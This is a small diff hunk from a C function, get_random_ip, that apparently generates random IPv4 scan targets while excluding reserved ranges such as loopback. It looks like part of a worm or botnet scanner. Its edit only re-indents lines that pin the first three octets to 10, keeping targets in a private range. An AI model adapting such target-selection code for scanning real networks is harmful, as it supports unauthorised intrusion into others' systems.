@@ -694,9 +694,9 @@ static ipv4_t get_random_ip(void)
         o2 = (tmp >> 8) & 0xff;
         o3 = (tmp >> 16) & 0xff;
         o4 = (tmp >> 24) & 0xff;
-	o1 = 10;
-	o2 = 10;
-	o3 = 10;
+        o1 = 10;
+        o2 = 10;
+        o3 = 10;
     }
     while (o1 == 127 ||                             // 127.0.0.0/8      - Loopback
           (o1 == 0) ||                              // 0.0.0.0/8        - Invalid address space
